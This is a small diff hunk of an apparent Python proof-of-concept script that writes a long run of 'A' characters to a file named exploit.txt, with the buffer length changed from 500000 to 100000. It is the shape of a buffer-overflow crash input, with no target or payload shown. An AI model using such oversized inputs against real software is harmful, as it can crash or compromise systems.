@@ -19,7 +19,7 @@
 
 #!/usr/bin/python
 
-t = "A" * 500000
+t = "A" * 100000
 
 try:
 	f=open("exploit.txt","w")
